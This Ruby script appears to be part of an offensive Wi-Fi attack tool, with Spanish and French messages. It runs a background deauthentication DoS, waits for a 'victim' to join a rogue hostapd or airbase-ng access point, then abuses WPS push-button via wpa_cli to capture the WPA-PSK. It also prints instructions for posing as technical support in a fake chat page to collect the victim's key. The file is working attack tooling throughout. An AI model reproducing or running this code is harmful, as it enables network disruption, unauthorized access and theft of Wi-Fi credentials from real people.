#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... limpieza de los ficheros\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartebis.txt").readlines.each do |cartebis|
   puts cartebis
$cartebis = cartebis.chomp
puts "Iniciando la tarjetas wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 2
`ip link set #{$cartebis} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
puts "Bye..."
exit
end
end
else
`rm -rf *.pid`
`killall airbase-ng`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
`rm -rf *.txt`
puts "Iniciando la tarjeta wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 3
`systemctl enable NetworkManager.service`
sleep 4
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
puts "Bye..."
exit
end
end


class Setup
def self.interface
load 'accessdos.rb'
puts "Iniciando la segunda tarjeta wifi en modo monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Setup.activeDos
end

def self.activeDos
puts "Iniciando la DoS..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Setup.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente   
`truncate -s 0 /tmp/hostapd.psk`
sleep 1
puts "Esperamos la victima... ctrl+c para salir..."
loop do
sleep 1
if File.zero?("/tmp/hostapd.psk")
else
puts "\e[1;32m[*] Alguièn se ha conectado...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
if File.exist?("terminalfrequence.pid")
Process.kill 15, File.read('/tmp/terminalfrequence.pid').to_i
else
nil
end
`killall xterm`
`killall sleep`
sleep 1
Thread.list.each do |thread|   # ces 2 lignes sont a mettre après le loop do qui test le fichier hostapd.psk
  thread.exit unless thread == Thread.current
end
break 
end
end
puts "Iniciando wpa_cli..."
load 'historique.rb'
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 4
`rfkill unblock all`
`ip link set #{$cartedos} up`
       puts "\e[1;32m[*] Esperamos por el boton  WPS... ctrl+c para salir...\e[0m"
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.3ES/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Setup.wpsgrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
sleep(5000000)
end

def self.wpsgrab
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
load 'lastattack.rb'
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] El boton WPS ha ido apoyado, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
end
end
end

################################### Airbase dos

class Ddos   # A VOIR SI mettre une fonction hostapd.txt avec include('associated')
def self.interface
load 'accessdos.rb'
puts "Lancement de la seconde cate wifi..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Ddos.dosAirbase
end

def self.dosAirbase
puts "Lancement de la DoS..."
dos = Thread.new { `bash rundosdev.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Ddos.waitVictime  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.waitVictime
puts "En attente de la victime... ctrl+c pour quitter..."
until File.read('hostapd.txt').include?('associated')
sleep 1
end
puts "\e[1;32m[*] Victime connectée.\e[0m"
Dir.chdir '/tmp'
sleep 1
Process.kill 15, File.read('/tmp/terminal.pid').to_i
if File.exist?("terminalfrequence.pid")
Process.kill 15, File.read('/tmp/terminalfrequence.pid').to_i
else
nil
end
`killall xterm`
`killall sleep`
sleep 1
Thread.list.each do |thread|   # ces 2 lignes sont a mettre après le loop do qui test le fichier hostapd.psk
  thread.exit unless thread == Thread.current
puts "Lancement de wpa_cli..."
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
load 'historique.rb'
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 4
`rfkill unblock all`
`ip link set #{$cartedos} up`
sleep 4
       puts "En attente de l'appui du bouton WPS... ctrl+c pour quitter..."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.3ES/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Ddos.wpaKey  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI
sleep(5000000)
end
end

def self.wpaKey
Dir.chdir '/tmp/hostbase-1.3ES'
sleep 1
load 'lastattack.rb'
sleep 1
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] Le bouton WPS a été appuyé, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |psk|
   puts psk
end
end
end

class Key
def self.hostapd
load 'accessdos.rb'
puts "Démarrage de la seconde carte wifi..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Key.dosHostapd
end

def self.dosHostapd
puts "Lancement de la DoS..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Key.wait  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.wait
puts "En attente de la victime... ctrl+c pour quitter..."
until File.read('hostapd.txt').include?('associated')
sleep 1
end
puts "\e[1;32m[*] Victime connectée...\e[0m"
puts "\e[1;32m[*] Allez sur la page assistance en ligne du tchat et envoyez le premier message: Bonjour service technique que puis-je faire pour vous ?...\e[0m"
puts "\e[1;94m[*] Pour voir si la victime a rentrée la clé: cat /var/www/msftconnecttest/cle.txt\e[0m"
end
end



class Cle
def self.airbase
load 'accessdos.rb'
puts "Démarrage de la seconde carte wifi..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Cle.suiteAirbase
end

def self.suiteAirbase
puts "Lancement de la DoS..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Cle.attente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end

def self.attente
puts "En attente de la victime... ctrl+c pour quitter..."
until File.read('airbase.txt').include?('associated')
sleep 1
end
puts "\e[1;32m[*] Victime connectée...\e[0m"
puts "\e[1;32m[*] Allez sur la page assistance en ligne du tchat et envoyez le premier message: Bonjour service technique que puis-je faire pour vous ?...\e[0m"
puts "\e[1;94m[*] Pour voir si la victime a rentrée la clé: cat /var/www/msftconnecttest/cle.txt\e[0m"
end
end






















